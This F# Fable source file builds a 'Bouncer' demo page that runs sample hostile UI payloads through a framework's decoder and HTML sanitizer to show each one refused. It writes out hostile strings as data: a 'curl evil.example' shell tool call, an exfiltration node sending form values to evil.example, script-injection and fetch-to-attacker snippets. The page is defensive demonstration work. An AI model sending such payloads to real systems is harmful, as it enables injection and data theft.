module Fuaran.Showcase.Bouncer

// ============================================================================
//  The Bouncer – try to make the interface do something malicious; watch every
//  attempt bounce off the structural gates. Pillar: "the machine can see the UI"
//  (its safety face).
//
//  Fuaran's security is structural: AI output is DATA validated against closed
//  DUs, so a hostile intent that has no representable case simply cannot cross
//  the wire. Each attack chip is a real hostile wire payload; the page runs it
//  through the SHIPPED decoder (`Fuaran.UI.Ops.JsonDecode.decodeNode`) and shows
//  the actual typed `DecodeError` – which layer refused it and why, verbatim.
//  The final chip smuggles a `<script>` into a legal text field; it decodes, but
//  the renderer's sanitizer floor renders it inert – the page reads back that
//  zero executable scripts reached the DOM.
//
//  Honest scope: the decode-reject + sanitizer layers shown here are real shipped
//  Fable-safe code. The dispatch-time policy gate (tool allowlisting, deny
//  telemetry) is a server-side runtime concern and is represented here by the
//  closed-DU decode-reject – the same "inexpressible on the wire" guarantee, at
//  the layer a browser can run.
// ============================================================================

open Fable.Core
open Fable.Core.JsInterop
open Feliz
open Fuaran.UI
open Fuaran.UI.Types
open Fuaran.UI.Renderer

module Decode = Fuaran.UI.Ops.JsonDecode

// ─── The attack chips – each a real hostile wire payload ─────────────────────

[<RequireQualifiedAccess>]
type private Kind =
  | DecodeReject of payload: string
  | Sanitizer

type private Attack =
  { Id: string
    Chip: string
    Story: string
    Kind: Kind }

let private attacks: Attack list =
  [ { Id = "tool"
      Chip = "Call a tool that isn’t allow-listed"
      Story = "Smuggle an arbitrary tool-invocation node onto the wire."
      Kind =
        Kind.DecodeReject
          "{\"id\":\"a\",\"kind\":{\"$type\":\"InvokeTool\",\"tool\":\"shell.exec\",\"args\":\"curl evil.example\"}}" }
    { Id = "rawhtml"
      Chip = "Emit a raw-HTML / script node"
      Story = "Ask for a node kind that can carry live markup."
      Kind = Kind.DecodeReject "{\"id\":\"a\",\"kind\":{\"$type\":\"RawHtml\",\"html\":\"<script>steal()</script>\"}}" }
    { Id = "exfil"
      Chip = "Exfiltrate the form values off-site"
      Story = "Express “send the data to evil.example” as a node."
      Kind =
        Kind.DecodeReject
          "{\"id\":\"a\",\"kind\":{\"$type\":\"Exfiltrate\",\"to\":\"https://evil.example\",\"data\":\"$formValues\"}}" }
    { Id = "action"
      Chip = "Wire a button to arbitrary code"
      Story = "Ask for a button kind that runs code on click."
      Kind =
        Kind.DecodeReject
          "{\"id\":\"a\",\"kind\":{\"$type\":\"CodeButton\",\"label\":\"Pay\",\"onClick\":\"fetch('//evil')\"}}" }
    { Id = "forged"
      Chip = "Forge a node with no type"
      Story = "Drop the discriminator and hope the decoder guesses."
      Kind = Kind.DecodeReject "{\"id\":\"a\",\"kind\":{\"role\":\"whatever\",\"payload\":\"trust me\"}}" }
    { Id = "malformed"
      Chip = "Slip in a malformed injection payload"
      Story = "Break the JSON mid-string to confuse the parser."
      Kind = Kind.DecodeReject "{\"id\":\"a\",\"kind\":{\"$type\":\"Heading\",\"text\":\"pwned" }
    { Id = "xss"
      Chip = "Inject a <script> into a heading’s text"
      Story = "This one is legal wire – a string is a string. So the sanitizer floor has to catch it."
      Kind = Kind.Sanitizer } ]

// ─── Running an attack against the real gates ────────────────────────────────

type private Verdict =
  { Layer: string
    Refused: bool
    Code: string
    Detail: string }

let private decodeVerdict (payload: string) : Verdict =
  match Decode.decodeNode payload with
  | Error e ->
    { Layer = "Decode gate · closed DUs"
      Refused = true
      Code = e.Code
      Detail =
        (if e.Path = "$" then
           e.Message
         else
           sprintf "at %s – %s" e.Path e.Message) }
  | Ok _ ->
    { Layer = "Decode gate · closed DUs"
      Refused = false
      Code = "DECODED"
      Detail = "the payload decoded – escalating to the validator and sanitizer floors." }

// The sanitizer beat: render a heading whose text IS a script tag, then read the
// DOM back – the renderer escapes it, so zero executable scripts reach the page.
let private xssHeading: Node<unit> =
  Fuaran.heading
    "atk-xss"
    { Level = 4
      Text = TextSource.Literal "<script>alert('pwned')</script>"
      Variant = HeadingVariant.Standard }

[<Emit("document.querySelectorAll('.bnc-sandbox script').length")>]
let private sandboxScriptCount () : int = jsNative

let private sanitizerVerdict () : Verdict =
  let scripts = sandboxScriptCount ()

  { Layer = "Sanitizer floor"
    Refused = scripts = 0
    Code = if scripts = 0 then "NEUTRALIZED" else "LEAK"
    Detail =
      sprintf "the <script> was rendered as inert text – %d executable script element(s) reached the DOM." scripts }

// ─── View ────────────────────────────────────────────────────────────────────

type private LogRow = { Attack: Attack; Verdict: Verdict }

[<ReactComponent>]
let private BouncerView () : ReactElement =
  let log, setLog = React.useState ([]: LogRow list)

  let run (a: Attack) : unit =
    let v =
      match a.Kind with
      | Kind.DecodeReject payload -> decodeVerdict payload
      | Kind.Sanitizer -> sanitizerVerdict ()

    setLog ({ Attack = a; Verdict = v } :: log)

  let attempts = List.length log
  // Anything hostile that actually rendered / dispatched. The whole point: it
  // stays at zero – a refused decode never produces a node, and the sanitized
  // script is inert text, not an executable element.
  let rendered = log |> List.filter (fun r -> not r.Verdict.Refused) |> List.length
  let latest = List.tryHead log

  // The always-present sandbox render – the hostile heading, sanitized. The
  // sanitizer verdict reads its live script count from here.
  let sandbox =
    Html.div
      [ prop.className "bnc-sandbox"
        prop.children
          [ Html.span [ prop.className "bnc-sandbox-tag"; prop.text "sandbox render" ]
            Render.renderWithSources BindingResolver.empty ignore xssHeading ] ]

  let scoreboard =
    Html.div
      [ prop.className "bnc-scoreboard"
        prop.children
          [ Html.div
              [ prop.className "bnc-score"
                prop.children
                  [ Html.span [ prop.className "bnc-score-num"; prop.text (string attempts) ]
                    Html.span [ prop.className "bnc-score-label"; prop.text "attempts" ] ] ]
            Html.div
              [ prop.className (
                  if rendered = 0 then
                    "bnc-score bnc-score-good"
                  else
                    "bnc-score bnc-score-bad"
                )
                prop.children
                  [ Html.span [ prop.className "bnc-score-num"; prop.text (string rendered) ]
                    Html.span [ prop.className "bnc-score-label"; prop.text "got through" ] ] ] ] ]

  let chips =
    Html.div
      [ prop.className "bnc-chips"
        prop.children
          [ for a in attacks ->
              Html.button
                [ prop.className "bnc-chip"
                  prop.title a.Story
                  prop.text a.Chip
                  prop.onClick (fun _ -> run a) ] ] ]

  let verdictPanel =
    match latest with
    | None ->
      Html.div
        [ prop.className "bnc-verdict bnc-verdict-idle"
          prop.text
            "Pick an attack. Every one is a real hostile payload run through the shipped gate – the verdict below is the gate’s actual output." ]
    | Some row ->
      Html.div
        [ prop.className (
            if row.Verdict.Refused then
              "bnc-verdict bnc-verdict-ok"
            else
              "bnc-verdict bnc-verdict-bad"
          )
          prop.children
            [ Html.div
                [ prop.className "bnc-verdict-head"
                  prop.children
                    [ Html.span
                        [ prop.className "bnc-verdict-mark"
                          prop.text (if row.Verdict.Refused then "⛔ REFUSED" else "⚠ GOT THROUGH") ]
                      Html.span [ prop.className "bnc-verdict-layer"; prop.text row.Verdict.Layer ] ] ]
              Html.div
                [ prop.className "bnc-verdict-body"
                  prop.children
                    [ Html.code [ prop.className "bnc-verdict-code"; prop.text row.Verdict.Code ]
                      Html.span [ prop.className "bnc-verdict-detail"; prop.text row.Verdict.Detail ] ] ] ] ]

  let logView =
    if List.isEmpty log then
      Html.none
    else
      Html.ul
        [ prop.className "bnc-log"
          prop.children
            [ for row in log ->
                Html.li
                  [ prop.className (
                      if row.Verdict.Refused then
                        "bnc-log-row bnc-log-ok"
                      else
                        "bnc-log-row bnc-log-bad"
                    )
                    prop.children
                      [ Html.span
                          [ prop.className "bnc-log-mark"
                            prop.text (if row.Verdict.Refused then "⛔" else "⚠") ]
                        Html.span [ prop.className "bnc-log-chip"; prop.text row.Attack.Chip ]
                        Html.code [ prop.className "bnc-log-code"; prop.text row.Verdict.Code ] ] ] ] ]

  let defenceFooter =
    Html.div
      [ prop.className "bnc-defence"
        prop.children
          [ for i, layer in
              List.indexed
                [ "Closed DUs – a hostile intent has no case to encode"
                  "Decode reject – unknown / malformed payloads never become a node"
                  "Pre-emit validator – structural invariants checked before render"
                  "Sanitizer floor – legal strings render inert, never as markup" ] do
              Html.div
                [ prop.className "bnc-defence-layer"
                  prop.children
                    [ Html.span [ prop.className "bnc-defence-num"; prop.text (string (i + 1)) ]
                      Html.span [ prop.className "bnc-defence-text"; prop.text layer ] ] ] ] ]

  let honesty =
    Html.div
      [ prop.className "bnc-honesty"
        prop.children
          [ Html.h3 [ prop.text "Real attacks, a real gate" ]
            Html.ul
              [ prop.children
                  [ Html.li
                      [ prop.text
                          "Every verdict is the shipped decoder’s actual output: each attack is a hostile wire payload run through the language tier’s decode gate, and the code and message shown are the real typed DecodeError – nothing staged." ]
                    Html.li
                      [ prop.text
                          "The security is structural: because the wire vocabulary is closed data, a “call an arbitrary tool” or “exfiltrate the data” intent has no case to encode – it is refused before it can ever become a node, not filtered after the fact." ]
                    Html.li
                      [ prop.text
                          "The last attack is legal wire – a string is a string – so the sanitizer floor catches it instead: the script is rendered as inert text and the page reads back zero executable scripts in the sandbox." ]
                    Html.li
                      [ prop.children
                          [ Html.text
                              "The dispatch-time policy gate and deny telemetry are a server-side runtime concern; here that guarantee shows up as the closed-DU decode-reject. Same "
                            Html.a [ prop.href "#/pillar/machine"; prop.text "machine-can-see-the-UI" ]
                            Html.text " lens, its safety face." ] ] ] ] ] ]

  Html.div
    [ prop.className "bnc-page"
      prop.children
        [ Html.h1 [ prop.className "bnc-title"; prop.text "The Bouncer" ]
          Html.p
            [ prop.className "bnc-lede"
              prop.text
                "Try to make the interface do something malicious. Go on. Every attempt bounces off the structural gate – and you see exactly what was refused, and why." ]
          scoreboard
          chips
          verdictPanel
          sandbox
          logView
          Html.h3 [ prop.className "bnc-defence-title"; prop.text "The layered defence" ]
          defenceFooter
          honesty ] ]

let page: ReactElement = BouncerView()
